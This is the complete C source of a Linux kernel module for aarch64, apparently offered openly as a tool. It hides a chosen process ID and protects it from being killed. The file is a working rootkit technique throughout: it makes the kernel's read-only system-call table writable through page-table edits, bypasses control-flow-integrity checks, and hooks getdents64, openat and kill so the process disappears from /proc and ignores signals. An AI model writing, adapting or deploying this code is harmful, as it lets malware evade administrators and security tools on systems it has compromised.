/*
 * hideproc_aarch64_final.c - 完整隐藏并保护指定 PID 的进程 (aarch64)
 * 功能：
 *   - 隐藏 /proc/<pid> 目录（通过 getdents64 过滤）
 *   - 隐藏 /proc/<pid>/ 内部文件（通过 openat 过滤）
 *   - 保护进程不被 kill（通过 kill 过滤）
 * 使用 mmuhack 解除 sys_call_table 写保护
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/cred.h>
#include <linux/capability.h>
#include <linux/version.h>
#include <linux/kprobes.h>
#include <linux/namei.h>
#include <linux/syscalls.h>
#include <linux/fdtable.h>
#include <linux/file.h>
#include <linux/dirent.h>
#include <linux/mm.h>
#include <linux/vmalloc.h>
#include <asm/tlbflush.h>
#include <asm/pgtable.h>
#include <linux/unistd.h>

#define DEVICE_NAME "hideproc"
#define HIDEPROC_IOC_MAGIC  'H'
#define HIDEPROC_SETPID     _IOW(HIDEPROC_IOC_MAGIC, 1, pid_t)

static pid_t protected_pid = 0;
static DEFINE_MUTEX(pid_lock);

/* -------------------- mmuhack 相关定义 -------------------- */
static unsigned long (*my_update_mapping_prot)(phys_addr_t pa, unsigned long start,
                                               unsigned long size, pgprot_t prot);
static unsigned long start_rodata, end_rodata;
static int (*my_set_memory_ro)(unsigned long addr, int numpages);
static int (*my_set_memory_rw)(unsigned long addr, int numpages);
static struct vm_struct *(*my_find_vm_area)(const void *addr);
static struct mm_struct *init_mm_ptr = NULL;

/* 通用 kallsyms 查找函数（兼容 5.7+） */
#if LINUX_VERSION_CODE >= KERNEL_VERSION(5, 7, 0)
static unsigned long (*kallsyms_lookup_name_sym)(const char *name);
static int _kallsyms_lookup_kprobe(struct kprobe *p, struct pt_regs *regs) { return 0; }
static unsigned long get_kallsyms_func(void)
{
    struct kprobe probe = { .symbol_name = "kallsyms_lookup_name", .pre_handler = _kallsyms_lookup_kprobe };
    if (register_kprobe(&probe) != 0) return 0;
    unsigned long addr = (unsigned long)probe.addr;
    unregister_kprobe(&probe);
    return addr;
}
unsigned long my_kallsyms_lookup_name(const char *name)
{
    if (!kallsyms_lookup_name_sym) {
        kallsyms_lookup_name_sym = (void *)get_kallsyms_func();
        if (!kallsyms_lookup_name_sym) return 0;
    }
    return kallsyms_lookup_name_sym(name);
}
#else
unsigned long my_kallsyms_lookup_name(const char *name)
{
    return kallsyms_lookup_name(name);
}
#endif

static unsigned long *find_syscall_table(void)
{
    unsigned long addr = my_kallsyms_lookup_name("sys_call_table");
    if (!addr) addr = my_kallsyms_lookup_name("__sys_call_table");
    return (unsigned long *)addr;
}

static int init_memhack(void)
{
    my_update_mapping_prot = (void *)my_kallsyms_lookup_name("update_mapping_prot");
    start_rodata = (unsigned long)my_kallsyms_lookup_name("__start_rodata");
    end_rodata = (unsigned long)my_kallsyms_lookup_name("__init_begin");
    if (end_rodata == 0)
        end_rodata = (unsigned long)my_kallsyms_lookup_name("__end_rodata");

    printk("[hideproc] update_mapping_prot: 0x%lx, start_rodata: 0x%lx, end_rodata: 0x%lx\n",
           (unsigned long)my_update_mapping_prot, start_rodata, end_rodata);

    if (!my_update_mapping_prot || !start_rodata || !end_rodata) {
        pr_err("hideproc: mmuhack init failed - missing symbols\n");
        return -1;
    }

    my_set_memory_ro = (void *)my_kallsyms_lookup_name("set_memory_ro");
    my_set_memory_rw = (void *)my_kallsyms_lookup_name("set_memory_rw");
    my_find_vm_area = (void *)my_kallsyms_lookup_name("find_vm_area");

    if (!my_set_memory_ro || !my_set_memory_rw || !my_find_vm_area) {
        pr_err("hideproc: mmuhack init failed - missing memory functions\n");
        return -1;
    }

    init_mm_ptr = (struct mm_struct *)my_kallsyms_lookup_name("init_mm");
    if (!init_mm_ptr) {
        pr_err("hideproc: cannot find init_mm\n");
        return -1;
    }
    return 0;
}

static pte_t *page_from_virt(uintptr_t addr)
{
    if (addr & (PAGE_SIZE - 1))
        addr = (addr + PAGE_SIZE) & ~(PAGE_SIZE - 1);

    pgd_t *pgd = pgd_offset(init_mm_ptr, addr);
    if (pgd_none(*pgd) || pgd_bad(*pgd)) return NULL;

    p4d_t *p4d = p4d_offset(pgd, addr);
    if (p4d_none(*p4d) || p4d_bad(*p4d)) return NULL;

    pud_t *pud = pud_offset(p4d, addr);
    if (pud_none(*pud) || pud_bad(*pud)) return NULL;

    pmd_t *pmd = pmd_offset(pud, addr);
    if (pmd_none(*pmd) || pmd_bad(*pmd)) return NULL;

    pte_t *ptep = pte_offset_kernel(pmd, addr);
    return ptep;
}

static void my_set_pte_at(struct mm_struct *mm, unsigned long addr,
                          pte_t *ptep, pte_t pte)
{
    typedef void (*set_pte_at_t)(struct mm_struct *, unsigned long, pte_t *, pte_t);
    typedef void (*flush_tlb_kernel_range_t)(unsigned long, unsigned long);

    static set_pte_at_t set_pte_at_ptr = NULL;
    static flush_tlb_kernel_range_t flush_tlb_kernel_range_ptr = NULL;

    if (!set_pte_at_ptr) {
        unsigned long sym_addr = my_kallsyms_lookup_name("set_pte_at");
        set_pte_at_ptr = (set_pte_at_t)sym_addr;
        if (!set_pte_at_ptr)
            pr_warn("hideproc: set_pte_at not found, falling back to direct assignment\n");
    }

    if (!flush_tlb_kernel_range_ptr) {
        unsigned long sym_addr = my_kallsyms_lookup_name("flush_tlb_kernel_range");
        flush_tlb_kernel_range_ptr = (flush_tlb_kernel_range_t)sym_addr;
        if (!flush_tlb_kernel_range_ptr)
            pr_warn("hideproc: flush_tlb_kernel_range not found, cannot flush TLB\n");
    }

    if (set_pte_at_ptr) {
        set_pte_at_ptr(mm, addr, ptep, pte);
    } else {
        *ptep = pte;
        if (flush_tlb_kernel_range_ptr)
            flush_tlb_kernel_range_ptr(addr, addr + PAGE_SIZE);
        else
            pr_err("hideproc: cannot flush TLB, system may become unstable\n");
    }
}

static int unprotect_syscall_entry(int nr)
{
    unsigned long *table = find_syscall_table();
    if (!table) return -ENOENT;

    unsigned long addr = (unsigned long)(&table[nr]);
    unsigned long page_addr = addr & PAGE_MASK;

    pte_t *ptep = page_from_virt(page_addr);
    if (!ptep || !pte_valid(READ_ONCE(*ptep))) {
        pr_err("hideproc: cannot get pte for 0x%lx\n", page_addr);
        return -EINVAL;
    }

    pte_t pte = READ_ONCE(*ptep);
    pte = pte_mkwrite(pte);
    my_set_pte_at(init_mm_ptr, page_addr, ptep, pte);
    return 0;
}

static int protect_syscall_entry(int nr)
{
    unsigned long *table = find_syscall_table();
    if (!table) return -ENOENT;

    unsigned long addr = (unsigned long)(&table[nr]);
    unsigned long page_addr = addr & PAGE_MASK;

    pte_t *ptep = page_from_virt(page_addr);
    if (!ptep || !pte_valid(READ_ONCE(*ptep))) {
        pr_err("hideproc: cannot get pte for 0x%lx\n", page_addr);
        return -EINVAL;
    }

    pte_t pte = READ_ONCE(*ptep);
    pte = pte_wrprotect(pte);
    my_set_pte_at(init_mm_ptr, page_addr, ptep, pte);
    return 0;
}
/* -------------------- mmuhack 结束 -------------------- */

/* 原系统调用指针 */
static long (*orig_sys_openat)(const struct pt_regs *);
static long (*orig_sys_kill)(const struct pt_regs *);
static long (*orig_sys_getdents64)(const struct pt_regs *);

/* CFI 绕过包装 */
__attribute__((no_sanitize("cfi")))
static long sys_openat_wrapper(const struct pt_regs *regs)
{
    return orig_sys_openat(regs);
}

__attribute__((no_sanitize("cfi")))
static long sys_kill_wrapper(const struct pt_regs *regs)
{
    return orig_sys_kill(regs);
}

__attribute__((no_sanitize("cfi")))
static long sys_getdents64_wrapper(const struct pt_regs *regs)
{
    return orig_sys_getdents64(regs);
}

/* aarch64 系统调用参数提取 */
static inline int get_arg0(const struct pt_regs *regs) { return regs->regs[0]; }
static inline unsigned long get_arg1(const struct pt_regs *regs) { return regs->regs[1]; }
static inline int get_arg2(const struct pt_regs *regs) { return regs->regs[2]; }

/* 自定义 openat：隐藏 /proc/<pid>/ 内部文件 */
static asmlinkage long hideproc_openat(const struct pt_regs *regs)
{
    const char __user *filename = (const char __user *)get_arg1(regs);
    long ret;
    char *path_buf;

    ret = sys_openat_wrapper(regs);
    if (ret < 0) return ret;
    if (!protected_pid) return ret;

    path_buf = kmalloc(PATH_MAX, GFP_KERNEL);
    if (!path_buf) return ret;

    if (strncpy_from_user(path_buf, filename, PATH_MAX) < 0) {
        kfree(path_buf);
        return ret;
    }
    path_buf[PATH_MAX - 1] = '\0';

    if (strncmp(path_buf, "/proc/", 6) == 0) {
        char *end;
        long pid = simple_strtol(path_buf + 6, &end, 10);
        if (pid > 0 && (*end == '/' || *end == '\0')) {
            if (pid == protected_pid) {
                close_fd(ret);
                ret = -ENOENT;
            }
        }
    }

    kfree(path_buf);
    return ret;
}

/* 自定义 kill：保护进程 */
static asmlinkage long hideproc_kill(const struct pt_regs *regs)
{
    pid_t pid = get_arg0(regs);
    int sig = get_arg1(regs);

    if (protected_pid && pid == protected_pid) {
        pr_info("hideproc: prevented signal %d to PID %d (returning ESRCH)\n", sig, pid);
        return -ESRCH;  // 进程不存在，符合隐藏逻辑
    }
    return sys_kill_wrapper(regs);
}

/* 自定义 getdents64：隐藏 /proc 中的 PID 目录项 */
static asmlinkage long hideproc_getdents64(const struct pt_regs *regs)
{
    unsigned int fd = get_arg0(regs);
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)get_arg1(regs);
    // unsigned int count = get_arg2(regs);

    long ret;
    char *buf = NULL;
    struct linux_dirent64 *kernel_buf = NULL;
    long buf_len = 0;
    struct file *file;

    ret = sys_getdents64_wrapper(regs);
    if (ret <= 0 || !protected_pid)
        return ret;

    file = fget(fd);
    if (!file)
        return ret;

    /* 检查是否为 proc 文件系统 */
    if (file->f_path.dentry->d_sb->s_type->name &&
        strcmp(file->f_path.dentry->d_sb->s_type->name, "proc") == 0) {
        kernel_buf = kmalloc(ret, GFP_KERNEL);
        if (!kernel_buf) {
            fput(file);
            return ret;
        }

        if (copy_from_user(kernel_buf, dirent, ret)) {
            kfree(kernel_buf);
            fput(file);
            return ret;
        }

        buf = (char *)kernel_buf;
        buf_len = 0;
        while (buf_len < ret) {
            struct linux_dirent64 *entry = (struct linux_dirent64 *)(buf + buf_len);
            unsigned short rec_len = entry->d_reclen;
            if (rec_len == 0)
                break;

            char *name = entry->d_name;
            long pid = 0;
            char *end;
            pid = simple_strtol(name, &end, 10);
            if (*end == '\0' && pid > 0 && pid == protected_pid) {
                /* 跳过此项，将后续数据前移 */
                memmove((char *)entry, (char *)entry + rec_len, ret - buf_len - rec_len);
                ret -= rec_len;
                continue;
            }
            buf_len += rec_len;
        }

        if (copy_to_user(dirent, kernel_buf, ret))
            ret = -EFAULT;

        kfree(kernel_buf);
    }

    fput(file);
    return ret;
}

/* 替换系统调用 */
static int replace_syscalls(void)
{
    unsigned long *sys_call_table = find_syscall_table();
    unsigned long addr;

    if (!sys_call_table) {
        pr_err("hideproc: cannot find sys_call_table\n");
        return -ENOENT;
    }

    addr = my_kallsyms_lookup_name("__arm64_sys_openat");
    if (!addr) { pr_err("hideproc: cannot find __arm64_sys_openat\n"); return -ENOENT; }
    orig_sys_openat = (void *)addr;

    addr = my_kallsyms_lookup_name("__arm64_sys_kill");
    if (!addr) { pr_err("hideproc: cannot find __arm64_sys_kill\n"); return -ENOENT; }
    orig_sys_kill = (void *)addr;

    addr = my_kallsyms_lookup_name("__arm64_sys_getdents64");
    if (!addr) { pr_err("hideproc: cannot find __arm64_sys_getdents64\n"); return -ENOENT; }
    orig_sys_getdents64 = (void *)addr;

    /* 解除写保护 */
    if (unprotect_syscall_entry(__NR_openat) || unprotect_syscall_entry(__NR_kill) ||
        unprotect_syscall_entry(__NR_getdents64)) {
        pr_err("hideproc: failed to unprotect syscall entries\n");
        return -EPERM;
    }

    sys_call_table[__NR_openat] = (unsigned long)hideproc_openat;
    sys_call_table[__NR_kill]   = (unsigned long)hideproc_kill;
    sys_call_table[__NR_getdents64] = (unsigned long)hideproc_getdents64;

    if (protect_syscall_entry(__NR_openat) || protect_syscall_entry(__NR_kill) ||
        protect_syscall_entry(__NR_getdents64)) {
        pr_warn("hideproc: failed to re-protect some syscall entries, but hooks are active\n");
    }

    pr_info("hideproc: syscalls hooked successfully\n");
    return 0;
}

static void restore_syscalls(void)
{
    unsigned long *sys_call_table = find_syscall_table();
    if (!sys_call_table) return;

    if (unprotect_syscall_entry(__NR_openat) == 0 &&
        unprotect_syscall_entry(__NR_kill) == 0 &&
        unprotect_syscall_entry(__NR_getdents64) == 0) {
        sys_call_table[__NR_openat] = (unsigned long)orig_sys_openat;
        sys_call_table[__NR_kill]   = (unsigned long)orig_sys_kill;
        sys_call_table[__NR_getdents64] = (unsigned long)orig_sys_getdents64;
        protect_syscall_entry(__NR_openat);
        protect_syscall_entry(__NR_kill);
        protect_syscall_entry(__NR_getdents64);
    }
    pr_info("hideproc: syscalls restored\n");
}

/* 设备接口 */
static long hideproc_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    pid_t pid;

    if (_IOC_TYPE(cmd) != HIDEPROC_IOC_MAGIC) return -ENOTTY;
    if (!uid_eq(current_uid(), GLOBAL_ROOT_UID) && !capable(CAP_SYS_ADMIN))
        return -EPERM;

    switch (cmd) {
    case HIDEPROC_SETPID:
        if (copy_from_user(&pid, (void __user *)arg, sizeof(pid_t)))
            return -EFAULT;
        mutex_lock(&pid_lock);
        protected_pid = pid;
        mutex_unlock(&pid_lock);
        pr_info("hideproc: protected pid set to %d\n", pid);
        return 0;
    default:
        return -ENOTTY;
    }
}

static const struct file_operations hideproc_fops = {
    .owner          = THIS_MODULE,
    .unlocked_ioctl = hideproc_ioctl,
#ifdef CONFIG_COMPAT
    .compat_ioctl   = hideproc_ioctl,
#endif
};

static struct miscdevice hideproc_dev = {
    .minor = MISC_DYNAMIC_MINOR,
    .name  = DEVICE_NAME,
    .fops  = &hideproc_fops,
    .mode  = 0600,
};

static int __init hideproc_init(void)
{
    int ret;

    if (init_memhack() != 0) {
        pr_err("hideproc: mmuhack initialization failed\n");
        return -1;
    }

    ret = replace_syscalls();
    if (ret) return ret;

    ret = misc_register(&hideproc_dev);
    if (ret) {
        pr_err("hideproc: misc_register failed: %d\n", ret);
        restore_syscalls();
        return ret;
    }

    pr_info("hideproc: loaded. device=/dev/%s\n", DEVICE_NAME);
    return 0;
}

static void __exit hideproc_exit(void)
{
    misc_deregister(&hideproc_dev);
    restore_syscalls();
    pr_info("hideproc: unloaded\n");
}

module_init(hideproc_init);
module_exit(hideproc_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("systemnb");
MODULE_DESCRIPTION("Completely hide and protect a process by PID (aarch64)");